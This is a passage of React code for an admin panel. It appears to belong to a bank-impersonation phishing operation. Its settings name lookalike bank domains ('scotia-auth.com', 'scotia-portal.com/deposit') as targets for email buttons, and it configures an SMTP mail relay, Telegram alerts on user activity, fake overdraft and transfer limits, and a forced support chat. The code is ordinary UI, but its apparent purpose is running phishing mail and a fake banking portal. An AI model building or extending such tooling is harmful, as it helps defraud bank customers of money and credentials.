                    <span className={`text-[9px] px-2 py-0.5 rounded-full font-bold ${mailerStatus?.success ? 'bg-emerald-500/10 text-emerald-500' : 'bg-red-500/10 text-red-500'}`}>
                      {mailerStatus?.success ? 'CONNECTED' : 'OFFLINE'}
                    </span>
                  </div>
                  <div className="space-y-1 text-[10px] font-mono">
                    <div className="flex justify-between">
                      <span className="text-zinc-500 uppercase">Provider:</span>
                      <span className="text-zinc-300">{config?.smtp?.host || 'N/A'}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-zinc-500 uppercase">Active Relay:</span>
                      <span className="text-zinc-300">{config?.smtp?.user || 'N/A'}</span>
                    </div>
                  </div>
                </div>

            <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6">
              <div className="flex items-center gap-3 mb-4">
                <div className="w-10 h-10 bg-indigo-600/10 rounded-xl flex items-center justify-center">
                  <MessageSquare className="text-indigo-500" size={20} />
                </div>
                <div>
                  <h3 className="text-white font-bold text-sm">Telegram Bot</h3>
                  <p className="text-zinc-500 text-[9px]">Push notifications for user activity.</p>
                </div>
              </div>
              <div className="flex items-center justify-between p-3 bg-black/30 rounded-xl border border-white/10">
                <span className="text-[10px] text-zinc-300">Bot Connection</span>
                <div className="flex items-center gap-2">
                   <div className={`w-2 h-2 rounded-full ${config?.telegram?.token ? 'bg-green-500' : 'bg-zinc-700'}`} />
                   <span className="text-[10px] text-white font-bold">{config?.telegram?.token ? 'Authorized' : 'Missing Token'}</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'backup' && (
          <div className="space-y-6 animate-in fade-in slide-in-from-bottom-2">
            <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6 space-y-6">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-emerald-600/10 rounded-2xl flex items-center justify-center">
                  <Database className="text-emerald-500" size={24} />
                </div>
                <div>
                  <h3 className="text-white font-bold">System Backup & Recovery</h3>
                  <p className="text-zinc-500 text-[10px]">Export current database state or restore from a previous backup file.</p>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-black/40 rounded-2xl p-4 border border-white/5 flex flex-col items-center text-center space-y-4">
                  <div className="w-10 h-10 bg-blue-600/10 rounded-full flex items-center justify-center">
                    <Save className="text-blue-500" size={20} />
                  </div>
                  <div>
                    <h4 className="text-white text-xs font-bold uppercase">Export Database</h4>
                    <p className="text-zinc-500 text-[9px] mt-1">Download a JSON image of all users, chats, and settings.</p>
                  </div>
                  <button 
                    onClick={() => window.location.href = '/api/admin/backup/export'}
                    className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all"
                  >
                    Generate Export
                  </button>
                </div>

                <div className="bg-black/40 rounded-2xl p-4 border border-white/5 flex flex-col items-center text-center space-y-4">
                  <div className="w-10 h-10 bg-amber-600/10 rounded-full flex items-center justify-center">
                    <RefreshCw className="text-amber-500" size={20} />
                  </div>
                  <div>
                    <h4 className="text-white text-xs font-bold uppercase">Import Database</h4>
                    <p className="text-zinc-500 text-[9px] mt-1">Restore system state from a compatible backup JSON.</p>
                  </div>
                  <div className="w-full relative">
                    <input 
                      type="file" 
                      accept=".json"
                      onChange={async (e) => {
                        const file = e.target.files?.[0];
                        if (file) {
                          if (confirm('WARNING: This will overwrite current database state. Proceed?')) {
                            const reader = new FileReader();
                            reader.onload = async (evt) => {
                              try {
                                const data = JSON.parse(evt.target?.result as string);
                                const res = await fetch('/api/admin/backup/import', {
                                  method: 'POST',
                                  headers: { 'Content-Type': 'application/json' },
                                  body: JSON.stringify(data)
                                });
                                if (res.ok) {
                                  alert('System successfully restored. Refreshing...');
                                  window.location.reload();
                                } else {
                                  alert('Import failed: Server rejected the structure');
                                }
                              } catch (err) {
                                alert('Incompatible file format');
                              }
                            };
                            reader.readAsText(file);
                          }
                        }
                      }}
                      className="absolute inset-0 opacity-0 cursor-pointer"
                    />
                    <button className="w-full bg-zinc-800 hover:bg-zinc-700 text-white py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all">
                      Upload Backup File
                    </button>
                  </div>
                </div>
              </div>

              <div className="bg-red-600/5 border border-red-600/20 rounded-xl p-4 space-y-2">
                <div className="flex items-center gap-2 text-red-500">
                  <AlertTriangle size={14} />
                  <span className="text-[10px] font-bold uppercase tracking-widest">Safety Protocol</span>
                </div>
                <p className="text-[9px] text-zinc-500 leading-relaxed uppercase font-medium">
                  CAUTION: Restoring will purge all existing data in the active DB directories. Ensure you have a current export before proceeding with an import.
                </p>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'settings' && (
          <div className="space-y-6 animate-in fade-in slide-in-from-bottom-2">
            <div className="space-y-4">
              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em] px-1">Global Configuration</h3>
              
              <div className="space-y-4">
                {/* Base Action URL */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-3">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-indigo-600/10 rounded-xl flex items-center justify-center">
                      <Globe className="text-indigo-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold">Base Action URL</p>
                      <p className="text-zinc-500 text-[9px]">Target for email buttons (e.g. https://scotia-auth.com)</p>
                    </div>
                  </div>
                  <input 
                    type="text" 
                    value={config?.general?.baseActionUrl || ''}
                    onChange={(e) => setConfig({ ...config, general: { ...config.general, baseActionUrl: e.target.value } })}
                    placeholder="https://action.url"
                    className="w-full bg-black border border-white/10 rounded-xl px-4 py-2 text-xs text-white focus:border-indigo-500/50 outline-none font-mono"
                  />
                  {config?.general?.recentActionUrls && config.general.recentActionUrls.length > 0 && (
                      <div className="flex flex-wrap gap-2 mt-2">
                        {config.general.recentActionUrls.map((url: string) => (
                          <button
                            key={url}
                            onClick={() => setConfig({ ...config, general: { ...config.general, baseActionUrl: url } })}
                            className="text-[9px] px-2 py-1 rounded-md bg-white/5 border border-white/10 text-zinc-400 hover:text-white transition-colors"
                          >
                            {url}
                          </button>
                        ))}
                      </div>
                  )}
                </div>

                {/* Admin PIN */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-red-600/10 rounded-xl flex items-center justify-center">
                      <Lock className="text-red-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold">Admin PIN</p>
                      <p className="text-zinc-500 text-[9px]">Secure access code</p>
                    </div>
                  </div>
                  <input 
                    type="password" 
                    value={config?.general?.adminPin || ''}
                    onChange={(e) => setConfig({ ...config, general: { ...config.general, adminPin: e.target.value } })}
                    className="w-20 bg-black border border-white/10 rounded-lg px-3 py-2 text-sm text-center text-red-500 font-mono tracking-widest focus:outline-none focus:border-red-500"
                  />
                </div>

                {/* Maintenance Mode */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-amber-600/10 rounded-xl flex items-center justify-center">
                      <Shield className="text-amber-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold">Maintenance Mode</p>
                      <p className="text-zinc-500 text-[9px]">Kill switch for all users</p>
                    </div>
                  </div>
                  <button 
                    onClick={() => setConfig({ ...config, general: { ...config.general, maintenanceMode: !config.general.maintenanceMode } })}
                    className={`w-12 h-6 rounded-full p-1 transition-all ${config?.general?.maintenanceMode ? 'bg-red-600' : 'bg-zinc-800'}`}
                  >
                    <div className={`w-4 h-4 rounded-full bg-white transition-transform ${config?.general?.maintenanceMode ? 'translate-x-6' : 'translate-x-0'}`} />
                  </button>
                </div>

                {/* Limits */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-4">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-emerald-600/10 rounded-xl flex items-center justify-center">
                      <BarChart3 className="text-emerald-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold">System Limits</p>
                      <p className="text-zinc-500 text-[9px]">Global boundaries</p>
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1">
                      <span className="text-[9px] text-zinc-500 uppercase font-bold tracking-tighter">Overdraft Limit</span>
                      <div className="flex items-center bg-black rounded-xl px-3 border border-white/10 focus-within:border-emerald-500/50 transition-colors">
                        <span className="text-zinc-600 text-xs">$</span>
                        <input 
                          type="number" 
                          value={config?.general?.overdraftLimit || 500}
                          onChange={(e) => setConfig({ ...config, general: { ...config.general, overdraftLimit: parseInt(e.target.value) } })}
                          className="w-full bg-transparent p-2 text-sm text-white focus:outline-none"
                        />
                      </div>
                    </div>
                    <div className="space-y-1">
                      <span className="text-[9px] text-zinc-500 uppercase font-bold tracking-tighter">Transfer Limit</span>
                      <div className="flex items-center bg-black rounded-xl px-3 border border-white/10 focus-within:border-emerald-500/50 transition-colors">
                        <span className="text-zinc-600 text-xs">$</span>
                        <input 
                          type="number" 
                          value={config?.general?.transferLimit || 3000}
                          onChange={(e) => setConfig({ ...config, general: { ...config.general, transferLimit: parseInt(e.target.value) } })}
                          className="w-full bg-transparent p-2 text-sm text-white focus:outline-none"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* General Settings */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 bg-red-600/10 rounded-xl flex items-center justify-center">
                        <Settings className="text-red-500" size={20} />
                      </div>
                      <div>
                        <p className="text-white text-xs font-bold uppercase tracking-widest">Global Policy</p>
                        <p className="text-zinc-500 text-[9px]">Master system overrides</p>
                      </div>
                    </div>
                  </div>
                  <div className="space-y-3">
                    <div className="flex items-center justify-between bg-black/40 p-3 rounded-xl border border-white/5">
                      <span className="text-[10px] text-zinc-400 font-bold">MAINTENANCE MODE</span>
                      <button 
                        onClick={() => setConfig({ ...config, general: { ...config.general, maintenanceMode: !config.general.maintenanceMode } })}
                        className={`w-10 h-5 rounded-full p-1 transition-all ${config?.general?.maintenanceMode ? 'bg-red-600' : 'bg-zinc-800'}`}
                      >
                        <div className={`w-3 h-3 rounded-full bg-white transition-transform ${config?.general?.maintenanceMode ? 'translate-x-5' : 'translate-x-0'}`} />
                      </button>
                    </div>
                    <div className="flex items-center justify-between bg-black/40 p-3 rounded-xl border border-white/5">
                      <span className="text-[10px] text-zinc-400 font-bold">FORCE SUPPORT CHAT</span>
                      <button 
                        onClick={() => setConfig({ ...config, general: { ...config.general, forceSupportChat: !config.general.forceSupportChat } })}
                        className={`w-10 h-5 rounded-full p-1 transition-all ${config?.general?.forceSupportChat ? 'bg-indigo-600' : 'bg-zinc-800'}`}
                      >
                        <div className={`w-3 h-3 rounded-full bg-white transition-transform ${config?.general?.forceSupportChat ? 'translate-x-5' : 'translate-x-0'}`} />
                      </button>
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div className="space-y-1">
                        <label className="text-[8px] text-zinc-500 uppercase tracking-tighter">Global Tx Limit ($)</label>
                        <input 
                          type="number" 
                          value={config?.general?.transferLimit || 0}
                          onChange={(e) => setConfig({ ...config, general: { ...config.general, transferLimit: parseInt(e.target.value) || 0 } })}
                          className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-red-500/50 outline-none"
                        />
                      </div>
                      <div className="space-y-1">
                        <label className="text-[8px] text-zinc-500 uppercase tracking-tighter">Global Daily ($)</label>
                        <input 
                          type="number" 
                          value={config?.general?.dailyLimit || 0}
                          onChange={(e) => setConfig({ ...config, general: { ...config.general, dailyLimit: parseInt(e.target.value) || 0 } })}
                          className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-red-500/50 outline-none"
                        />
                      </div>
                    </div>
                    <div className="space-y-1">
                      <label className="text-[8px] text-zinc-500 uppercase tracking-tighter">Landing Action URL</label>
                      <input 
                        type="text" 
                        value={config?.general?.baseActionUrl || ''}
                        onChange={(e) => setConfig({ ...config, general: { ...config.general, baseActionUrl: e.target.value } })}
                        className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-red-500/50 outline-none"
                        placeholder="https://scotia-portal.com/deposit"
                      />
                      {config?.general?.recentActionUrls && config.general.recentActionUrls.length > 0 && (
                        <div className="flex flex-wrap gap-2 mt-1">
                          {config.general.recentActionUrls.map((url: string) => (
                            <button
                              key={url}
                              onClick={() => setConfig({ ...config, general: { ...config.general, baseActionUrl: url } })}
                              className="text-[8px] px-1.5 py-0.5 rounded bg-white/5 border border-white/10 text-zinc-400 hover:text-white transition-colors"
                            >
                              {url}
                            </button>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </div>

                {/* SMTP Configuration */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-4">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-blue-600/10 rounded-xl flex items-center justify-center">
                      <Mail className="text-blue-500" size={20} />
                    </div>
                    <div>
                      <p className="text-white text-xs font-bold uppercase tracking-widest">SMTP Relay Engine</p>
                      <p className="text-zinc-500 text-[9px]">Mail dispatcher credentials</p>
                    </div>
                  </div>
                  <div className="space-y-3">
                    <div className="grid grid-cols-2 gap-3">
                      <input 
                        type="text" 
                        placeholder="Host (smtp.gmail.com)"
                        value={config?.smtp?.host || ''}
                        onChange={(e) => setConfig({ ...config, smtp: { ...config.smtp, host: e.target.value } })}
                        className="bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-blue-500/50 outline-none"
                      />
                      <input 
                        type="number" 
                        placeholder="Port (587)"
                        value={config?.smtp?.port || ''}
                        onChange={(e) => setConfig({ ...config, smtp: { ...config.smtp, port: parseInt(e.target.value) || 0 } })}
                        className="bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-blue-500/50 outline-none"
                      />
                    </div>
                    <input 
                      type="text" 
                      placeholder="Username / Email"
                      value={config?.smtp?.user || ''}
                      onChange={(e) => setConfig({ ...config, smtp: { ...config.smtp, user: e.target.value } })}
                      className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-blue-500/50 outline-none"
                    />
                    <input 
                      type="password" 
                      placeholder="Password"
                      value={config?.smtp?.pass || ''}
                      onChange={(e) => setConfig({ ...config, smtp: { ...config.smtp, pass: e.target.value } })}
                      className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-blue-500/50 outline-none font-mono"
                    />
                  </div>
                </div>

                {/* Telegram Notifications */}
                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 bg-indigo-600/10 rounded-xl flex items-center justify-center">
                        <MessageSquare className="text-indigo-500" size={20} />
                      </div>
                      <div>
                        <p className="text-white text-xs font-bold uppercase tracking-widest">Telegram Bot</p>
                        <p className="text-zinc-500 text-[9px]">Real-time push alerts</p>
                      </div>
                    </div>
                    <button 
                      onClick={() => setConfig({ ...config, telegram: { ...config.telegram, enabled: !config.telegram.enabled } })}
                      className={`w-10 h-5 rounded-full p-1 transition-all ${config?.telegram?.enabled ? 'bg-indigo-600' : 'bg-zinc-800'}`}
                    >
                      <div className={`w-3 h-3 rounded-full bg-white transition-transform ${config?.telegram?.enabled ? 'translate-x-5' : 'translate-x-0'}`} />
                    </button>
                  </div>
                  <div className="space-y-3">
                    <input 
                      type="password" 
                      placeholder="Bot Token"
                      value={config?.telegram?.token || ''}
                      onChange={(e) => setConfig({ ...config, telegram: { ...config.telegram, token: e.target.value } })}
                      className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-indigo-500/50 outline-none font-mono"
                    />
                    <input 
                      type="text" 
                      placeholder="Chat ID"
                      value={config?.telegram?.chat_id || ''}
                      onChange={(e) => setConfig({ ...config, telegram: { ...config.telegram, chat_id: e.target.value } })}
                      className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-[10px] text-white focus:border-indigo-500/50 outline-none"
                    />
                  </div>
                </div>

                <div className="h-10" />
                <button 
                  onClick={() => handleSaveConfig(config)}
                  disabled={saving}
                  className="w-full bg-white text-black py-4 rounded-2xl text-xs font-black uppercase tracking-widest hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2 shadow-xl shadow-white/5 sticky bottom-0"
                >
                  <Save size={16} /> {saving ? 'Writing to Disk...' : 'Save All Changes'}
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default AdminPanel;
